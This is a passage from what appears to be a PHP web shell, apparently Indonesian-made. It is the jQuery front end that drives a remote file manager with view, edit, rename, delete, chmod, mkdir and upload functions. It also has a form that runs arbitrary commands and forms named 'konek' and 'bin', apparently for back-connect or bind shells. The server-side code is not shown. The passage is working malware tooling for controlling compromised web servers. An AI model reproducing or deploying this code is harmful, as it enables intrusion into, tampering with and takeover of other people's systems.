					} else {
						om.find('.modal-title').html('View '+(xtype.value).toUpperCase()+': /'+xname.value);
						callbacks('view', xpath.value, xname.value, function(e){
							om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code><pre class="mb-0">'+e+'</pre></code>');
						});
					}
					om.on('hidden.bs.modal', function (e){
						om.find('.modal-title').html('unknown');
						om.find('.modal-body').attr('style', '').html('null');
					});
            });
         }
			if($('#fileman').length>0){
				$('#fileman').on('click', 'a#ffmanager', function(e){
					e.stopPropagation();
					var path = $(this), pattr = path.attr('data-path');
					genfileman(pattr, function(){
						var selopt = document.querySelectorAll('#showaksi');
						selactopt(selopt);
					});
				});
				$('#fileman').on('click', 'a#fxmanager', function(e){
					e.stopPropagation();
					var path = $(this), pattr = path.attr('data-path');
					genfileman(pattr, function(){
						var selopt = document.querySelectorAll('#showaksi');
						selactopt(selopt);
					});
				});
			}
			$('#showchmod').on('show.bs.modal', function(e){
				var btn = $(e.relatedTarget), modals = $(this).find('.modal-body');
				var xtype = btn.attr('data-xtype'), xname = btn.attr('data-xname'), xpath = btn.attr('data-xpath'), xperm = btn.attr('data-xperm');
				modals.find('input[name="xtype"]').val(xtype);
				modals.find('input[name="xname"]').val(xname);
				modals.find('input[name="xpath"]').val(xpath);
				modals.find('input[name="xperm"]').val(xperm);
				modals.find('input[id="xname"]').val(xname);
				modals.find('label[for="xname"]').text(xtype.toUpperCase());
			});
			$(document).on('submit', 'form#requestdel', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						alert(response);
						$('body').find('#modalshowaksi').modal('hide');
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});				
			});
			$(document).on('submit', 'form#requestrename', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						alert(response);
						$('body').find('#modalshowaksi').modal('hide');
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});
			});
         $(document).on('submit', 'form#requestreadfile', function(e){
				e.preventDefault();
				var fom = $(this), chkdir = fom.find('input[name="xpath"]').val(), om = $('#modalshowaksi'), mbody = '', mtit = '';
				fom.find('button[type="submit"]').prop('disabled',true);
				if(chkdir.length<1){
					alert('Isi dulu nama filenya pak!');
				} else {
					om.modal('show');
					om.find('.modal-title').html('View FILE: '+chkdir);
					$.ajax({
						type: 'post',
						url: fom.attr('action'),
						data: fom.serialize(),
						beforeSend: function(){
							$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
						},
						success: function(response){
							fom.next('span').remove();
							fom.find('button[type="submit"]').prop('disabled',false);
							om.find('.modal-body').attr('style', 'background:#dfdfdf;').html('<code><pre class="mb-0">'+response+'</pre></code>');
						}
					});
				}
			});			
			$(document).on('submit', 'form#requesteditfile', function(e){
				e.preventDefault();
				var fom = $(this), xdata = btoa(fom.find('textarea[name="xdata"]').val());
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: {'xdata': xdata},
					beforeSend: function(){
						$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						alert(response);
						$('body').find('#modalshowaksi').modal('hide');
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});
			});
         $(document).on('submit', 'form#requestchmod', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						alert(response);
						var axs = $('#fileman').find('a#ffmanager');
						axs[axs.length-1].click(function(e){
							e.stopPropagation();
						});
					}
				});
			});
         $(document).on('submit', 'form#requestchdir', function(e){
				e.preventDefault();
				var fom = $(this), chkdir = fom.find('input[name="xpath"]').val();
				if(chkdir.length<1){
					alert('Isi dulu nama direktorinya pak!');
				} else {
					fom.find('button[type="submit"]').prop('disabled',true);
					genfileman(chkdir, function(){
						var selopt = document.querySelectorAll('#showaksi');
						selactopt(selopt);
					});
					fom.find('button[type="submit"]').prop('disabled',false);
            }
         });
         $(document).on('submit', 'form#requestmkdir', function(e){
				e.preventDefault();
				var fom = $(this), chkdir = fom.find('input[name="xdir"]').val();
				if(chkdir.length<1){
					alert('Isi dulu nama direktorinya pak!');
				} else {
					fom.find('button[type="submit"]').prop('disabled',true);
					$.ajax({
						type: 'post',
						url: fom.attr('action'),
						data: fom.serialize(),
						beforeSend: function(){
							$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
						},
						success: function(response){
							fom.next('span').remove();
							fom.find('button[type="submit"]').prop('disabled',false);
							$('<span id="notify" class="mb-3">'+response+'</span>').insertAfter(fom);
							var axs = $('#fileman').find('a#ffmanager');
							axs[axs.length-1].click(function(e){
								e.stopPropagation();
							});
							fom.next('span#notify').fadeTo(3000, 500).slideUp(500, function(){
								$(this).slideUp(500);
							});
						}
					});
				}
			});
         $('input[type="file"]').on('change', function(){
            let files = $(this).prop('files');
            $(this).next('.custom-file-label').html(files[0].name);
         });
         $(document).on('submit', 'form#requestupload', function(e){
				e.preventDefault();
				var fom = $(this);
				var file_data = fom.find('input[name="xfile"]').prop('files');
				var form_data = new FormData(this);
				if(file_data && file_data.size < 1){
					alert('File kosong, gak ada isinya!');
				} else {
					fom.find('button[type="submit"]').prop('disabled',true);
					form_data.append('xfile', file_data);
					$.ajax({
						type: 'post',
						url: fom.attr('action'),
						data: form_data,
						dataType: 'text',
						contentType:false,
						processData:false,
						beforeSend: function(){
							fom.next('span').remove();
							$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
						},
						success: function(response){
							fom[0].reset();
							fom.next('span').remove();
							fom.find('button[type="submit"]').prop('disabled',false);
							$('<span id="notify" class="mb-3">'+response+'</span>').insertAfter(fom);
							var axs = $('#fileman').find('a#ffmanager');
							axs[axs.length-1].click(function(e){
								e.stopPropagation();
							});
							fom.next('span#notify').fadeTo(3000, 500).slideUp(500, function(){
								$(this).slideUp(500);
							});
						}
					});	
				}
			});
         $(document).on('submit', 'form#requestcmd', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						fom.next('div.card').remove();
						$('<span><i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...</span>').insertAfter(fom);
					},
					success: function(response){
						fom.next('span').remove();
						fom.find('button[type="submit"]').prop('disabled',false);
						$('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+response+'</div></div>').insertAfter(fom);
					}
				});
			});
         $(document).on('submit', 'form#requestkonek', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('body').find('#outputkonek').html('<i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...');
					},
					success: function(response){
						fom.find('button[type="submit"]').prop('disabled',false);
						$('body').find('#outputkonek').html('<div class="alert alert-secondary">'+response+'</div>');
					}
				});
			});
         $(document).on('submit', 'form#requestbin', function(e){
				e.preventDefault();
				var fom = $(this);
				fom.find('button[type="submit"]').prop('disabled',true);
				$.ajax({
					type: 'post',
					url: fom.attr('action'),
					data: fom.serialize(),
					beforeSend: function(){
						$('body').find('#outputkonek').html('<i class="fa-solid fa-spinner fa-spin-pulse fa-fw"></i> Tunggu bentar...');
					},
					success: function(response){
						fom.find('button[type="submit"]').prop('disabled',false);
						$('body').find('#outputkonek').html('<div class="alert alert-secondary">'+response+'</div>');
					}
				});
			});
		})(jQuery);
		</script>
	</body>
</html>
<?php }?>